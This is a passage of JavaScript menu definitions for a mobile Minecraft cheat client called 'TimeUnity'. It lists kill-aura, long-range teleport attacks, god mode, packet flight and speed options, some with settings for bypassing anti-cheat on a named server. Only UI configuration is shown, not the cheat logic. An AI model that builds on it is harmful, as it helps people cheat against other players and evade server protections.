          "max_lines": 6,
          "hint": "示例:admin"
        },
        {
          "type": "EditText",
          "name": "输入密码",
          "color": "#B4000000",
          "key": "Registerpass",
          "max_lines": 6,
          "hint": "示例:123456789"
        },
        {
          "type": "TextView",
          "name": "确认注册",
          "color": "#B4000000",
          "key": "Confirm_Registration"
        }
      ]
    }
  ]
}`

const TU主菜单 = `{
  "type": "Menu",
  "title": {
    "name": "TimeUnity",
    "size": 16,
    "elevation": 3,
    "background": "${main_title_background || "#FFFFFF"}",
    "padding": [4, 2, 4, 2],
    "text_margins": [3, 2, 3, 2],
    "colors": ${JSON.stringify(main_title_colors || ["#FF0000", "#000F0F"])}
  },
  "color": "${main_color || "#FFFFFF"}",
  "alpha": ${main_alpha || 0.85},
  "radius": ${main_radius || 8},
  "items": [
  {
      "type": "TextView",
      "name": "TimeUnity",
      "color": "${main_item_color || "#121212"}",
      "tag": "TimeUnity",
      "items": [
        {
          "type": "TextView",
          "name": " >战斗类< ",
          "color": "${menu_item_child_color || "#121212"}",
          "open": "TU战斗类"
        },
        {
          "type": "TextView",
          "name": " >移动类< ",
          "color": "${menu_item_child_color || "#121212"}",
          "open": "TU移动类"
        },
        {
          "type": "TextView",
          "name": " >玩家类< ",
          "color": "${menu_item_child_color || "#121212"}",
          "open": "TU玩家类"
        },
        {
          "type": "TextView",
          "name": " >辅助类< ",
          "color": "${menu_item_child_color || "#121212"}",
          "open": "TU辅助类"
        },
        {
          "type": "TextView",
          "name": " >娱乐类< ",
          "color": "${menu_item_child_color || "#121212"}",
          "open": "TU娱乐类"
        },
        {
          "type": "TextView",
          "name": " >渲染类< ",
          "color": "${menu_item_child_color || "#121212"}",
          "open": "TU渲染类"
        },
        {
          "type": "TextView",
          "name": " >开发类< ",
          "color": "${menu_item_child_color || "#121212"}",
          "open": "TU开发类"
        },
        {
          "type": "TextView",
          "name": " >原版类< ",
          "color": "${menu_item_child_color || "#121212"}",
          "open": "TU原版类"
        },
        {
          "type": "TextView",
          "name": " >设置类< ",
          "color": "${menu_item_child_color || "#121212"}",
          "open": "TU设置类"
        },
        {
          "type": "TextView",
          "name": "退出脚本",
          "color": "#DC143C",
          "key": "TU_exit"
        }
      ]
     }
   ]
}`
const TU战斗类 = `{
  "type": "Menu",
  "title": {
    "name": "『 TU-战斗 』",
    "size": 16,
    "elevation": 3,
    "background": "${main_title_background || "#FFFFFF"}",
    "padding": [4, 2, 4, 2],
    "text_margins": [3, 2, 3, 2],
    "colors": ${JSON.stringify(main_title_colors || ["#FF0000", "#000F0F"])}
  },
  "color": "${main_color || "#FFFFFF"}",
  "alpha": ${main_alpha || 0.85},
  "radius": ${main_radius || 8},
  "can_close": true,
  "hide_fun": true,
  "hide": true,
  "items": [
    {
      "type": "TextView",
      "name": "『 TU-战斗 』",
      "color": "${main_item_color || "#121212"}",
      "tag": "TU战斗类",
      "items": [
        {
          "type": "Switch",
          "name": "杀戮光环",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "off": "TimeUnity_Shortcut/close/KillAura.png",
            "on": "TimeUnity_Shortcut/open/KillAura.png",
            "icon": "TimeUnity_Shortcut/close/KillAura.png"
          },
          "key": "KillAura",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": ${Ftion.exist("KillAura")}
        },
        {
          "type": "CheckBox",
          "name": "攻击玩家",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "KillAura_Mode_player",
          "checked": true,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "攻击生物",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "KillAura_Mode_mob",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "静默模式",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "KillAura_SilentMode",
          "checked": false
        },
        {
          "type": "CheckBox",
          "name": "自动选取",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "KillAura_CutSword",
          "checked": true
        },
        {
          "type": "CheckBox",
          "name": "搭路不选",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "KillAura_NotCutSword",
          "checked": true,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "攻击隐身",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "AttackInvisible",
          "checked": true,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "是否挥手",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Swing",
          "checked": true,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "穿墙攻击",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "checkCollision",
          "checked": true,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "视角转头",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "KillAura_silentRot",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "发包转头",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "KillAura_PacketRot",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "绕EC攻击",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "KillAura_ECAttack",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "转服关闭",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "KillAura_Transferred",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "死亡关闭",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "KillAura_health",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "自动投掷物",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "KillAura_Throwing",
          "checked": true,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "仅下落攻击",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "KillAura_Atacked",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "启用白名单",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "KillAura_WhiteList_Enabled",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "启用黑名单",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "KillAura_BlackList_Enabled",
          "checked": false,
          "enabled": true
        },
        {
          "type": "EditText",
          "name": "白名单",
          "color": "${main_item_color || "#121212"}",
          "key": "KillAura_WhiteList",
          "hint": "玩家A,玩家B",
          "max_lines": 6
        },
        {
          "type": "EditText",
          "name": "黑名单",
          "color": "${main_item_color || "#121212"}",
          "key": "KillAura_BlackList",
          "hint": "玩家A,玩家B",
          "max_lines": 6
        },
        {
          "type": "SeekBar",
          "name": "攻击速度",
          "color": "${main_item_color || "#121212"}",
          "key": "KillAura_CPS",
          "format": "攻击速度 %d",
          "min": 1,
          "max": 20,
          "value": 16
        },
        {
          "type": "SeekBar",
          "name": "攻击距离",
          "color": "${main_item_color || "#121212"}",
          "key": "KillAura_Range",
          "format": "攻击距离 %.2f",
          "min": 2.00,
          "max": 6.00,
          "value": 3.60
        },
        {
          "type": "SeekBar",
          "name": "目标数量",
          "color": "${main_item_color || "#121212"}",
          "key": "KillAura_MaxTarget",
          "format": "目标数量 %d",
          "min": 1,
          "max": 3,
          "value": 1
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "KillAura_Throwing_Distance",
          "format": "投掷距离 %.2f",
          "min": 1.00,
          "max": 10.00,
          "value": 6.00
        },
        {
          "type": "SeekBar",
          "name": "视角限制",
          "color": "${main_item_color || "#121212"}",
          "key": "KillAura_FOV",
          "format": "视角限制 %d",
          "min": 0,
          "max": 360,
          "value": 360
        },
        {
          "type": "SeekBar",
          "name": "空刀概率",
          "color": "${main_item_color || "#121212"}",
          "key": "KillAura_Undercut",
          "format": "空刀概率 %d",
          "min": 0,
          "max": 100,
          "value": 0
        },
        {
          "type": "Switch",
          "name": "百米大刀",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/InfiniteAura.png",
            "on": "TimeUnity_Shortcut/open/InfiniteAura.png",
            "icon": "TimeUnity_Shortcut/close/InfiniteAura.png"
          },
          "key": "InfiniteAura",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": ${Ftion.exist("InfiniteAura")}
        },
        {
          "type": "RadioGroup",
          "name": "锁敌逻辑",
          "color": "${main_item_color || "#121212"}",
          "key": "InfiniteAura_choice",
          "items": [
            {
              "key": "InfiniteAura_group",
              "name": "距离",
              "color": "${main_item_color || "#121212"}",
              "checked": false
            },
            {
              "key": "InfiniteAura_monomer",
              "name": "血量",
              "color": "${main_item_color || "#121212"}",
              "checked": false
            }
          ]
        },
        {
          "type": "CheckBox",
          "name": "攻击玩家",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "AttackPlayer",
          "checked": true,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "攻击实体",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "AttackEntity",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "启用白名单",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "InfiniteAura_WhiteList_Enabled",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "启用黑名单",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "InfiniteAura_BlackList_Enabled",
          "checked": false,
          "enabled": true
        },
        {
          "type": "EditText",
          "name": "白名单",
          "color": "${main_item_color || "#121212"}",
          "key": "InfiniteAura_WhiteList",
          "hint": "玩家A,玩家B",
          "max_lines": 6
        },
        {
          "type": "EditText",
          "name": "黑名单",
          "color": "${main_item_color || "#121212"}",
          "key": "InfiniteAura_BlackList",
          "hint": "玩家A,玩家B",
          "max_lines": 6
        },
        {
          "type": "CheckBox",
          "name": "租赁服模式",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "NodeMode",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "布吉岛模式",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "BJD_Mode",
          "checked": false
        },
        {
          "type": "CheckBox",
          "name": "违规重连",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "InfiniteAura_BJDMode_Reconnect",
          "checked": false
        },
        {
          "type": "CheckBox",
          "name": "传送点击",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "InfiniteAura_TPClick",
          "checked": true,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "返回点击",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "InfiniteAura_ReturnClick",
          "checked": true,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "返回发包",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "InfiniteAura_ReturnPacket",
          "checked": false
        },
        {
          "type": "CheckBox",
          "name": "是否挥手",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "InfiniteAura_swing",
          "checked": true,
          "enabled": true
        },
        {
          "type": "SeekBar",
          "name": "最大距离",
          "color": "${main_item_color || "#121212"}",
          "key": "InfiniteAura_Range",
          "format": "最大距离%d",
          "min": 10,
          "max": 500,
          "value": 500
        },
        {
          "type": "SeekBar",
          "name": "攻击间隔",
          "color": "${main_item_color || "#121212"}",
          "key": "InfiniteAura_Interval",
          "format": "攻击间隔%d",
          "min": 0,
          "max": 30,
          "value": 10
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "InfiniteAura_TeleCount",
          "format": "传送次数%d",
          "min": 1,
          "max": 10,
          "value": 1
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "InfiniteAura_AtkStats",
          "format": "攻击次数%d",
          "min": 1,
          "max": 10,
          "value": 1
        },
        {
          "type": "SeekBar",
          "name": "遍历间隔",
          "color": "${main_item_color || "#121212"}",
          "key": "InfiniteAura_Delay",
          "format": "遍历间隔%d",
          "min": 0,
          "max": 10,
          "value": 0
        },
        {
          "type": "SeekBar",
          "name": "攻击数量",
          "color": "${main_item_color || "#121212"}",
          "key": "MaxTarget",
          "format": "攻击数量%d",
          "min": 1,
          "max": 20,
          "value": 3
        },
        {
            "type": "Switch",
            "key": "Global_InfiniteAura",
            "name": "全局百米",
            "color": "${main_item_color || "#121212"}"
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "Global_InfiniteAura_TeleCount",
          "format": "传送次数%d",
          "min": 1,
          "max": 10,
          "value": 2
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "Global_InfiniteAura_AttackCount",
          "format": "攻击次数%d",
          "min": 1,
          "max": 10,
          "value": 1
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "Global_InfiniteAura_Delay",
          "format": "攻击间隔%d",
          "min": 0,
          "max": 5,
          "value": 3
        },
        {
          "type": "Switch",
          "name": "上帝模式",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/GodMode.png",
            "on": "TimeUnity_Shortcut/open/GodMode.png",
            "icon": "TimeUnity_Shortcut/close/GodMode.png"
          },
          "key": "GodMode",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "随机距离",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "GodMode_RandomHeight",
          "checked": true
        },
        {
          "type": "CheckBox",
          "name": "纵向模式",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "GodMode_Vertical",
          "checked": false
        },
        {
          "type": "CheckBox",
          "name": "拾取物品",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "GodMode_PickUp",
          "checked": false
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "GodMode_Teleport",
          "format": "传送次数%d",
          "min": 1,
          "max": 5,
          "value": 1
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "GodMode_TP_height",
          "format": "传送高度%d",
          "min": 100,
          "max": 100000,
          "value": 100000
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "GodMode_TP_Vertical",
          "format": "纵向距离%d",
          "min": 10,
          "max": 40,
          "value": 30
        },
        {
          "type": "Switch",
          "name": "重锤秒杀",
          "color": "${main_item_color || "#121212"}",
          "key": "Hammer",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "off": "TimeUnity_Shortcut/close/Hammer.png",
            "on": "TimeUnity_Shortcut/open/Hammer.png",
            "icon": "TimeUnity_Shortcut/close/Hammer.png"
          },
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "AttackHeight",
          "format": "发包次数%d",
          "min": 10,
          "max": 500,
          "value": 10
        },
        {
          "type": "Switch",
          "name": "水晶光环",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/CrystalAura.png",
            "on": "TimeUnity_Shortcut/open/CrystalAura.png",
            "icon": "TimeUnity_Shortcut/close/CrystalAura.png"
          },
          "key": "CrystalAura",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "CrystalAura_Range",
          "format": "放置距离%d",
          "min": 1,
          "max": 50,
          "value": 7
        },
        {
          "type": "CheckBox",
          "name": "攻击生物",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "CrystalAura_AttackEntity",
          "checked": false
        },
        {
          "type": "CheckBox",
          "name": "攻击水晶",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "CrystalAura_AttackCrystal",
          "checked": true
        },
        {
          "type": "Switch",
          "name": "弓箭追踪",
          "color": "${main_item_color || "#121212"}",
          "key": "BowTrack",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "玩家",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "BowTrack_Player",
          "checked": true
        },
        {
          "type": "CheckBox",
          "name": "生物",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "BowTrack_Entity",
          "checked": false
        },
        {
          "type": "Switch",
          "name": "击杀嘲讽",
          "color": "${main_item_color || "#121212"}",
          "key": "Killnsult",
          "checked": false,
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/Killnsult.png",
            "on": "TimeUnity_Shortcut/open/Killnsult.png",
            "icon": "TimeUnity_Shortcut/close/Killnsult.png"
          },
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "布吉岛模式",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Killnsult_BJDMode",
          "checked": true
        },
        {
          "type": "Switch",
          "name": "击杀隐藏",
          "color": "${main_item_color || "#121212"}",
          "key": "SilentKill",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "被打还击",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/AutoRetaliate.png",
            "on": "TimeUnity_Shortcut/open/AutoRetaliate.png",
            "icon": "TimeUnity_Shortcut/close/AutoRetaliate.png"
          },
          "key": "AutoRetaliate",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "RadioGroup",
          "name": "选择模式",
          "color": "${main_item_color || "#121212"}",
          "key": "AutoRetaliate_choice",
          "items": [
            {
              "key": "AutoRetaliate_Entity",
              "name": "生物",
              "color": "${main_item_color || "#121212"}",
              "checked": false
            },
            {
              "key": "AutoRetaliate_Player",
              "name": "玩家",
              "color": "${main_item_color || "#121212"}",
              "checked": false
            }
          ]
        },
        {
          "type": "Switch",
          "name": "反假人",
          "color": "${main_item_color || "#121212"}",
          "key": "AntiBot",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "删除假人",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "shouldDelete",
          "checked": true,
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "反反假人",
          "color": "${main_item_color || "#121212"}",
          "key": "AntiAntiBot",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "智能队友",
          "color": "${main_item_color || "#121212"}",
          "key": "AutoTeam",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "排除相同头盔颜色",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "check_armor",
          "checked": true,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "排除空头盔",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "check_skin",
          "checked": true,
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "攻击回溯",
          "color": "${main_item_color || "#121212"}",
          "key": "BackTrack",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/BackTrack.png",
            "on": "TimeUnity_Shortcut/open/BackTrack.png",
            "icon": "TimeUnity_Shortcut/close/BackTrack.png"
          },
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "BackTrack_Tick",
          "format": "回溯延迟 %dTick",
          "min": 0,
          "max": 10,
          "value": 0
        },
        {
          "type": "Switch",
          "name": "刀刀暴击",
          "color": "${main_item_color || "#121212"}",
          "key": "Critical",
          "checked": false,
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/Critical.png",
            "on": "TimeUnity_Shortcut/open/Critical.png",
            "icon": "TimeUnity_Shortcut/close/Critical.png"
          },
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "布吉岛模式",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Critical_BJDMode",
          "checked": false,
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "无摔落伤害",
          "color": "${main_item_color || "#121212"}",
          "key": "NoFall",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "CheckBox",
          "name": "布吉岛模式",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "NoFall_BJDMode",
          "checked": false
        },
        {
          "type": "Switch",
          "name": "幽灵模式",
          "color": "${main_item_color || "#121212"}",
          "key": "GhostMode",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        }
      ]
    }
  ]
}`
const TU移动类 = `{
    "type": "Menu",
    "title": {
        "name": "『 TU-移动 』",
        "size": 16,
        "elevation": 3,
        "background": "${main_title_background || "#FFFFFF"}",
        "padding": [4, 2, 4, 2],
        "text_margins": [3, 2, 3, 2],
        "colors": ${JSON.stringify(main_title_colors || ["#FF0000", "#000F0F"])}
    },
    "color": "${main_color || "#FFFFFF"}",
    "alpha": ${main_alpha || 0.85},
    "radius": ${main_radius || 8},
    "can_close": true,
    "hide": true,
    "items": [
        {
            "type": "Switch",
            "name": "移动加速",
            "color": "${main_item_color || "#121212"}",
            "shortcut": {
                "type": "CheckedButton",
                "params": [60, 50],
                "no_circle": true,
                "off": "TimeUnity_Shortcut/close/speed.png",
                "on": "TimeUnity_Shortcut/open/speed.png",
                "icon": "TimeUnity_Shortcut/close/speed.png"
            },
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "tag": "fun_ride_flying",
            "items": [
                {
                    "type": "CheckBox",
                    "key": "Hop",
                    "name": "移动跳跃",
                    "color": "${menu_item_check_color || "#121212"}",
                    "checked": true
                },
                {
                    "type": "SeekBar",
                    "key": "Speed",
                    "format": "移动速度%.2f",
                    "color": "${main_item_color || "#121212"}",
                    "value": 0.32,
                    "min": 0.10,
                    "max": 1.00
                },
                {
                    "type": "SeekBar",
                    "key": "JumpHeight",
                    "format": "跳跃高度%.2f",
                    "color": "${main_item_color || "#121212"}",
                    "value": 0.40,
                    "min": 0.01,
                    "max": 5.00
                }
            ]
        },
        {
            "type": "TextView",
            "name": "『 TU-移动 』",
            "color": "${main_item_color || "#121212"}",
            "tag": "TU移动类",
            "items": [
                {
                    "type": "Switch",
                    "name": "飞行",
                    "color": "${main_item_color || "#121212"}",
                    "shortcut": {
                        "type": "CheckedButton",
                        "params": [60, 50],
                        "no_circle": true,
                        "off": "TimeUnity_Shortcut/close/Fly.png",
                        "on": "TimeUnity_Shortcut/open/Fly.png",
                        "icon": "TimeUnity_Shortcut/close/Fly.png"
                    },
                    "on_sound": "TimeUnity/开启音效.mp3",
                    "off_sound": "TimeUnity/关闭音效.mp3",
                    "key": "Fly",
                    "checked": false,
                    "enabled": ${Ftion.exist("FlyFunc")}
                },
                {
                    "type": "CheckBox",
                    "key": "Fly_Snake",
                    "name": "蛇型飞行",
                    "color": "${menu_item_check_color || "#121212"}",
                    "checked": true
                },
                {
                    "type": "CheckBox",
                    "key": "Fly_Packet",
                    "name": "发包飞行",
                    "color": "${menu_item_check_color || "#121212"}",
                    "checked": true
                },
                {
                    "type": "SeekBar",
                    "key": "Fly_Speed",
                    "format": "飞行速度%.2f",
                    "color": "${main_item_color || "#121212"}",
                    "value": 3.00,
                    "min": 0.01,
                    "max": 10.00
                },
                {
                    "type": "SeekBar",
                    "key": "Fly_SetUD",
                    "format": "上下速度%.2f",
                    "color": "${main_item_color || "#121212"}",
                    "value": 3.00,
                    "min": 0.01,
                    "max": 10.00
                },
                {
                  "type": "RadioGroup",
                  "name": "移动类型",
                  "color": "${main_item_color || "#121212"}",
                  "key": "Fly_choice",
                  "items": [
                    {
                      "key": "Fly_Pos",
                      "name": "坐标",
                      "color": "${main_item_color || "#121212"}",
                      "checked": false
                    },
                    {
                      "key": "Fly_Motion",
                      "name": "移动",
                      "color": "${main_item_color || "#121212"}",
                      "checked": true
                    }
                  ]
                },
                {
                    "type": "Switch",
                    "name": "布吉岛飞行",
                    "color": "${main_item_color || "#121212"}",
                    "shortcut": {
                        "type": "CheckedButton",
                        "params": [60, 50],
                        "no_circle": true,
                        "off": "TimeUnity_Shortcut/close/BJDFly.png",
                        "on": "TimeUnity_Shortcut/open/BJDFly.png",
                        "icon": "TimeUnity_Shortcut/close/BJDFly.png"
                    },
                    "key": "BJDFly",
                    "on_sound": "TimeUnity/开启音效.mp3",
                    "off_sound": "TimeUnity/关闭音效.mp3",
                    "checked": false,
                    "enabled": true
                },
                {
                    "type": "SeekBar",
                    "key": "BJDFly_Speed",
                    "format": "飞行速度%.2f",
                    "color": "${main_item_color || "#121212"}",
                    "value": 1.00,
                    "min": 0.01,
                    "max": 10.00
                },
                {
                    "type": "SeekBar",
                    "key": "BJDFly_Packet",
                    "format": "发包次数%d",
                    "color": "${main_item_color || "#121212"}",
                    "value": 1,
                    "min": 1,
                    "max": 5
                },
                {
                    "type": "Switch",
                    "name": "自动疾跑",
                    "color": "${main_item_color || "#121212"}",
                    "key": "AutoSprint",
                    "on_sound": "TimeUnity/开启音效.mp3",
                    "off_sound": "TimeUnity/关闭音效.mp3",
                    "checked": false,
                    "enabled": true
                },
                {
                    "type": "Switch",
                    "name": "移动跳跃",
                    "color": "${main_item_color || "#121212"}",
                    "shortcut": {
                    "type": "CheckedButton",
                    "params": [60, 50],
                    "no_circle": true,
                    "on_sound": "TimeUnity/开启音效.mp3",
                    "off_sound": "TimeUnity/关闭音效.mp3",
                    "off": "TimeUnity_Shortcut/close/MoveJump.png",
                    "on": "TimeUnity_Shortcut/open/MoveJump.png",
                    "icon": "TimeUnity_Shortcut/close/MoveJump.png"
                    },
                    "key": "MoveJump",
                    "on_sound": "TimeUnity/开启音效.mp3",
                    "off_sound": "TimeUnity/关闭音效.mp3",
                    "checked": false,
                    "enabled": true
                },
                {
                    "type": "Switch",
                    "name": "兔子跳",
                    "color": "${main_item_color || "#121212"}",
                    "key": "JumpSpeed",
                    "shortcut": {
                        "type": "CheckedButton",
                        "params": [60, 50],
                        "no_circle": true,
                        "off": "TimeUnity_Shortcut/close/JumpSpeed.png",
                        "on": "TimeUnity_Shortcut/open/JumpSpeed.png",
                        "icon": "TimeUnity_Shortcut/close/JumpSpeed.png"
                    },
                    "on_sound": "TimeUnity/开启音效.mp3",
                    "off_sound": "TimeUnity/关闭音效.mp3",
                    "checked": false
                },
                {
                    "type": "SeekBar",
                    "color": "${main_item_color || "#121212"}",
                    "key": "JumpSpeed_Speed",
                    "format": "移动速度%.2f",
                    "min": 0.01,
                    "max": 1.00,
                    "value": 0.28
                },
                {
                    "type": "SeekBar",
                    "color": "${main_item_color || "#121212"}",
                    "key": "JumpSpeed_Height",
                    "format": "跳跃高度%.2f",
                    "min": 0.01,
                    "max": 1.00,
                    "value": 0.40
                },
                {
                    "type": "Switch",
                    "name": "宝马加速",
                    "color": "${main_item_color || "#121212"}",
                    "key": "BJDSpeed",
                    "shortcut": {
                        "type": "CheckedButton",
                        "params": [60, 50],
                        "no_circle": true,
                        "off": "TimeUnity_Shortcut/close/BJDSpeed.png",
                        "on": "TimeUnity_Shortcut/open/BJDSpeed.png",
                        "icon": "TimeUnity_Shortcut/close/BJDSpeed.png"
                    },
                    "on_sound": "TimeUnity/开启音效.mp3",
                    "off_sound": "TimeUnity/关闭音效.mp3",
                    "checked": false
                },
                {
                    "type": "SeekBar",
                    "color": "${main_item_color || "#121212"}",
                    "key": "BJDSpeed_Speed",
                    "format": "速度%.2f",
                    "min": 0.20,
                    "max": 0.60,
                    "value": 0.30
                },
                {
                    "type": "SeekBar",
                    "color": "${main_item_color || "#121212"}",
                    "key": "BJDSpeed_Timer",
                    "format": "变速%.2f",
                    "min": 20.0,
                    "max": 100.0,
                    "value": 25.0
                },
                {
                    "type": "Switch",
                    "name": "虚空回弹",
                    "color": "${main_item_color || "#121212"}",
                    "key": "AntiVoid",
                    "shortcut": {
                        "type": "CheckedButton",
                        "params": [60, 50],
                        "no_circle": true,
                        "off": "TimeUnity_Shortcut/close/AntiVoid.png",
                        "on": "TimeUnity_Shortcut/open/AntiVoid.png",
                        "icon": "TimeUnity_Shortcut/close/AntiVoid.png"
                    },
                    "on_sound": "TimeUnity/开启音效.mp3",
